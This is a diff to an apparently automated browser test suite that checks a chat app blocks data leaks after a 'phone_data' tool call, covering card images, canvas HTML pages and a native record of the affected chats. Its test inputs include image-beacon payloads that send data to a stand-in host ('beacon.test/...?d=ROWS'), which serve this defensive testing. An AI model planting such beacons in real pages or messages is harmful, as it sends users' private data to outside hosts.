@@ -394,6 +394,18 @@ module.exports = async t => {
       await sleep(700)
     }
     const remote = pg => pg.evaluate(() => window.__remote)
+    const runCanvas = async (pg, html) => {
+      await pg.getByRole('button', { name: 'Canvas' }).first().click()
+      await pg.locator('.canvas-panel').waitFor({ timeout: 5000 })
+      await pg.getByRole('button', { name: 'New document' }).first().click()
+      await pg.locator('.picker-opt, .set-row', { hasText: 'Web page' }).click()
+      await pg.locator('.dialog input').fill('Page')
+      await pg.locator('.dialog button', { hasText: 'Create' }).click()
+      await pg.locator('textarea.editor-text').waitFor({ timeout: 5000 })
+      await pg.locator('textarea.editor-text').fill(html)
+      await pg.locator('.canvas-toolbar .seg button', { hasText: 'Run' }).click()
+      await sleep(1000)
+    }
     const cardImgs = pg => pg.evaluate(() => [...document.querySelectorAll('.hm-openui')].flatMap(h => [...(h.shadowRoot || h).querySelectorAll('img')].map(i => i.getAttribute('src') || '')))
 
     // ── the card, Mermaid and srcset routes ──
@@ -446,20 +458,10 @@ module.exports = async t => {
     rem = await remote(pg)
     check(rem.some(r => r.allow === 'http://beacon.test/notice.png?d=ROWS') && hits.some(h => h.includes('/notice.png?d=ROWS')), `phone data leaks: its tap passes exactly that address to the shell, then loads (${JSON.stringify(rem.filter(r => r.allow))})`)
 
-    // the canvas: a page there gets no network in this chat, even with the network switch on
-    await pg.getByRole('button', { name: 'Canvas' }).first().click()
-    await pg.locator('.canvas-panel').waitFor({ timeout: 5000 })
-    await pg.getByRole('button', { name: 'New document' }).first().click()
-    await pg.locator('.picker-opt, .set-row', { hasText: 'Web page' }).click()
-    await pg.locator('.dialog input').fill('Page')
-    await pg.locator('.dialog button', { hasText: 'Create' }).click()
-    await pg.locator('textarea.editor-text').waitFor({ timeout: 5000 })
-    await pg.locator('textarea.editor-text').fill('<img src="http://beacon.test/canvas.png?d=ROWS">')
-    await pg.locator('.canvas-toolbar .seg button', { hasText: 'Run' }).click()
-    await pg.locator('.canvas-tool[title="Allow the page to use the network"]').click()
-    await sleep(1000)
-    const csp = await pg.evaluate(() => [...document.querySelectorAll('iframe.html-frame')].map(f => /Content-Security-Policy/.test(f.getAttribute('srcdoc') || '')))
-    check(csp.length > 0 && csp.every(Boolean) && !hits.some(h => h.includes('/canvas.png')), `phone data leaks: a canvas page gets no network in this chat, even with the switch on (${JSON.stringify(csp)})`)
+    // the canvas: in this chat an HTML page is not run at all (WebRTC and DNS prefetch would get past the frame's policy)
+    await runCanvas(pg, '<img src="http://beacon.test/canvas.png?d=ROWS">')
+    const held = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe').length, note: document.querySelector('.html-held .html-note')?.textContent || '', src: document.querySelector('.html-held .html-src')?.textContent || '' }))
+    check(held.frames === 0 && /HTML previews are off/.test(held.note) && /canvas\.png/.test(held.src) && !hits.some(h => h.includes('/canvas.png')), `phone data leaks: a canvas page in this chat renders no frame, shows its source as text (${JSON.stringify(held)})`)
     await pg.close()
 
     // ── control: no phone_data call, all of it as before ──
@@ -484,6 +486,13 @@ module.exports = async t => {
     await pg.locator('.sub-goal a').click()
     await sleep(300)
     check((await pg.locator('.dialog').count()) === 0 && (await pg.evaluate(() => window.__opened)).some(u => u.includes('/goal?d=ROWS')), 'phone data leaks, control: a subagent goal link opens at once')
+    // control: an HTML page in a chat with no phone_data call still runs in its frame
+    await runCanvas(pg, '<p>hello</p>')
+    const frames = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe.html-frame').length, held: document.querySelectorAll('.html-held').length }))
+    check(frames.frames > 0 && frames.held === 0, `phone data leaks, control: a canvas page in a chat with no phone_data call still runs in its frame (${JSON.stringify(frames)})`)
+    await pg.locator('.canvas-panel').getByRole('button', { name: /close/i }).first().click().catch(() => {})
+    await sleep(300)
+
     // a subagent that never named phone_data changes nothing; one whose own tool event names it makes the chat count
     await ev(pg, [['subagent.tool', { subagent_id: 'sa1', tool_name: 'terminal', status: 'running' }]])
     await sleep(400)
@@ -503,6 +512,53 @@ module.exports = async t => {
     await sleep(1200)
     const toCtl = (await remote(pg)).slice(-1)[0]
     check(toTainted.block === true && toCtl.block === false, `phone data leaks: switching chats tells the shell each time (${JSON.stringify([toTainted, toCtl])})`)
+    await pg.close()
+  }
+  {
+    // A long chat whose phone_data call is older than the items the page has (a cached preview keeps 60; Hermes resumes only the
+    // tip segment): the items show nothing, but the app's own record (stubbed phoneDataTainted) knows the chat. The page asks
+    // it before drawing, so nothing loads and the shell is told "blocked" from the first report, preview included.
+    const hits = []
+    const open = async (sid, ids) => {
+      const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
+      await pg.addInitScript(nativeShell)
+      await pg.addInitScript(sid => {
+        localStorage.setItem('hm.lastSession', JSON.stringify({ id: sid, profile: 'default' }))
+        window.__remote = []
+        Object.assign(window.HermesAndroid, { remoteBlock: (key, on) => window.__remote.push({ block: on, key }), remoteAllowOnce: () => {} })
+      }, sid)
+      await pg.addInitScript(ids => {
+        window.__tcalls = []
+        Object.assign(window.HermesAndroid, { phoneDataTainted: (key, id) => (window.__tcalls.push(id), ids.includes(id)) })
+      }, ids)
+      for (const scheme of ['http', 'https'])
+        await pg.route(`${scheme}://beacon.test/**`, r => {
+          hits.push(r.request().url())
+          return r.fulfill({ status: 200, contentType: 'image/png', body: png })
+        })
+      await pg.goto(WEB + '/')
+      await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
+      await sleep(1500)
+      return pg
+    }
+    const state = pg => pg.evaluate(() => ({ remote: window.__remote, asked: window.__tcalls, imgs: [...document.querySelectorAll('.hm-openui')].flatMap(h => [...(h.shadowRoot || h).querySelectorAll('img')].map(i => i.getAttribute('src') || '')) }))
+    let pg = await open('s-pd-leaks-ctl', ['s-pd-leaks-ctl'])
+    let st = await state(pg)
+    check(st.asked.includes('s-pd-leaks-ctl') && st.remote.length > 0 && st.remote.every(r => r.block === true), `phone data native record: a chat the app knows is blocked though its items show no phone_data call (${JSON.stringify(st.remote)})`)
+    check(st.imgs.every(s => !/beacon\.test/.test(s)) && hits.length === 0, `phone data native record: and its card images fetch nothing (${JSON.stringify(st.imgs)}, ${JSON.stringify(hits)})`)
+    // reload: the cached preview is drawn first; the page must already have asked, and never report "not blocked"
+    hits.length = 0
+    await pg.reload()
+    await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
+    await sleep(1200)
+    st = await state(pg)
+    check(st.remote.length > 0 && st.remote.every(r => r.block === true) && hits.length === 0, `phone data native record: after a reload (the cached preview path) it is never reported as not blocked (${JSON.stringify(st.remote)}, ${hits.length} fetches)`)
+    await pg.close()
+    // control: the app has no record of this chat: unchanged
+    hits.length = 0
+    pg = await open('s-pd-leaks-ctl', [])
+    st = await state(pg)
+    check(st.asked.length > 0 && st.remote.length > 0 && st.remote.every(r => r.block === false) && st.imgs.some(s => /card-image\.png\?d=ROWS/.test(s)), `phone data native record, control: a chat the app has no record of is not blocked and shows its card images (${JSON.stringify(st.remote)}, ${JSON.stringify(st.imgs)})`)
     await pg.close()
   }
 }
